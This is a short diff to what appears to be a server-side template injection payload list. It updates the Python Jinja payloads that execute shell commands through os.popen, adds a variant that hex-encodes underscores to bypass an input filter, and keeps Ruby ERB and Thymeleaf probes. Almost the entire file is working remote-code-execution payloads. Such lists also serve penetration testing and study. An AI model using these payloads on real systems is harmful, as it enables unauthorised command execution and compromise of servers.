@@ -1,9 +1,13 @@
 # Python Jinja
 {{7*7}}
-{{cycler.__init__.__globals__.os.popen("id").read()}}
+{{lipsum.__globals__.os.popen("id").read()}}
+## bypass '_' filter:
+{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f")).os.popen("id").read()}}
+
 
 # Ruby ERB
 <%= IO.popen("id").readlines() %>
+
 
 # Java Spring with Thymeleaf
 *{7*7}
